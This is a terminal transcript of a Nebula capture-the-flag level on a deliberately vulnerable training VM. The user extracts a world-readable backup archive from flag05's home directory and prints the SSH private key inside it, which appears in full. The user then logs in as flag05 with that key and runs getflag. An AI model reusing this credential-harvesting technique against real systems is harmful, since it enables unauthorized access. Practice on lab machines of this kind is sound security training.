```
level05@nebula:/tmp$ cd /home/flag05/
level05@nebula:/home/flag05$ ls -la
total 5
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 .
drwxr-xr-x 1 root   root     200 2012-08-27 07:18 ..
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .backup
-rw-r--r-- 1 flag05 flag05   220 2011-05-18 02:54 .bash_logout
-rw-r--r-- 1 flag05 flag05  3353 2011-05-18 02:54 .bashrc
-rw-r--r-- 1 flag05 flag05   675 2011-05-18 02:54 .profile
drwx------ 2 flag05 flag05    70 2011-11-20 20:13 .ssh
level05@nebula:/home/flag05$ cd .ssh/
-sh: cd: .ssh/: Permission denied
level05@nebula:/home/flag05$ ls -la .backup/
total 2
drwxr-xr-x 2 flag05 flag05    42 2011-11-20 20:13 .
drwxr-x--- 4 flag05 level05   93 2012-08-18 06:56 ..
-rw-rw-r-- 1 flag05 flag05  1826 2011-11-20 20:13 backup-19072011.tgz
level05@nebula:/home/flag05$ tar xzvf .backup/backup-19072011.tgz -C /tmp
.ssh/
.ssh/id_rsa.pub
.ssh/id_rsa
.ssh/authorized_keys
level05@nebula:/home/flag05$ cat /tmp/.ssh/id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAywCDXFL7nGpgxuT8y8ZYyzif565M6LexECfaRFl6ECQtP2Vp
vns4RR0HeVFpZMD2dhQQ76sXXK4Jph0/xVRgYytF1hsCJLiedJ3+aWyRMYtkgvZD
TDDD9lYGPzsb3FLqBocxCEpYJLruISY1YdzXpYgIBEVc8Sgq8Ur1uPMHAMYOL+b3
Hga2upWO7vBU9g91SLB6IMyje+2doO5NqmPNgNLzqsPNnv4eiFy46WMAbq9K5tP7
txhQdRxYZwMbhnJ+CLJ0EgXUAgdkvnjlGeD5okP61Eh7lbzHiws68SkflBvcw8KA
sMF6TSXoQECRgoi9ycwTZy4xWspUqij+sY+3EQIDAQABAoIBAAGir2w+/ufzs3Pm
xGKf5nc8rY0gSl5VnIeUyp1iWylmITcxifiO5ZUo9rZzgXXeWB37a2eC6V1Fya4c
7jaYx24FGzruXMYO9rfZzgLrbQAJL3YepcwnWGzTpJk90Kulv1zuGecHMk6ZcvGx
bRysutAKmIXwSR9oQ3BOOkyTKKtI6YeKSnUNU1KVO1t//ps2wFcfXRFb17prpokx
5clWwfUYRLBQlB4XjBIJ3tswpyC0PNOFfzoF+VeUlN9XZFrL0JWHX1F9DDOFJYL5
bXw7zwhjEvZ0/qOvZSJiH4lkbmANsBeMNY/JOGV6T7dWthKBGehCnupeADZVaSeo
Qlysa0ECgYEA6x4FwgpeqNtNGeCcSAUtoviTYMD5LfMEpY8t9eGdRpzw1CDlmG9x
k1LgzE3eA0qlJYx5NNqYEefIPVLdmSuSGS/5KqHeB8Ph7+WqLmguwIIIrfRJoPaD
ON2XqLU6YzAEazTrXnqALjOvP3qdN57xK0zoBAfYlkXJRgMYE1S23YsCgYEA3QhF
Fl11csPc2Yyz/7+9MG9JnOckYvuir+bf3fj/HEuIC9ylwXd4GfSLAW02Sg8DlfRh
M7MxCW9OEWtKgUtHe3fGc6/6X1yF7QfeAYZm8UX/fo6PxuX++mvfPxM4i6vRjgzB
Qy8WisqTK9nLZO+hEdPoVqalz0iUsvu2umz0CVMCgYAsNoUWrCSI1FR3XUmGMZMX
Zm8wbpltDpn9GCOobTjKIpEXEuiZ9bsB3T/wq2Poco0DtprEWabnFxMMlRyexRbA
LclJPw8lnqxKFIIgH+9KvCktrRZ7cl/SvbjbPNkx9cGe92Cbb6XTCl0WLtSJtRXc
8qVevKr59z2WMNbCK9gHaQKBgQDRaQNjpBohKFX2OytSU8uftuBMamV77iJ9e0SA
Hmc83IbBjkPwnwrHtHt6V4lG8yCXktgAznXYFX8mW7tT8gmAfcMkWgbhEFzGbFy2
nyqqzoG42sJ3U/KWOVtifAhns9qvNYBo8ZTu2+xBcHAWaj31EQqgBfU0BPT0+ixu
RcmThwKBgAi0ej7ylHhtwODQGghRmDpxEx9deJ0jilM2EnqIecJj5jnPW8BKDgV4
Dc1QljBeCQ1r30DGYmOIazbhm+orm4df6HWPayRhNBlkmulqTs5GHvLMPjcKMB0k
0Xna7QOtBAnzoHpLcrfvBdfRNE1eC87YkPUhmm5hBgG0+TeMmWgr
-----END RSA PRIVATE KEY-----
level05@nebula:/home/flag05$ ssh -i /tmp/.ssh/id_rsa localhost -l flag05

      _   __     __          __
     / | / /__  / /_  __  __/ /___ _
    /  |/ / _ \/ __ \/ / / / / __ `/
   / /|  /  __/ /_/ / /_/ / / /_/ /
  /_/ |_/\___/_.___/\__,_/_/\__,_/

    exploit-exercises.com/nebula


For level descriptions, please see the above URL.

To log in, use the username of "levelXX" and password "levelXX", where
XX is the level number.

Currently there are 20 levels (00 - 19).


Welcome to Ubuntu 11.10 (GNU/Linux 3.0.0-12-generic i686)

 * Documentation:  https://help.ubuntu.com/
New release '12.04 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

flag05@nebula:~$ getflag
You have successfully executed getflag on a target account
```
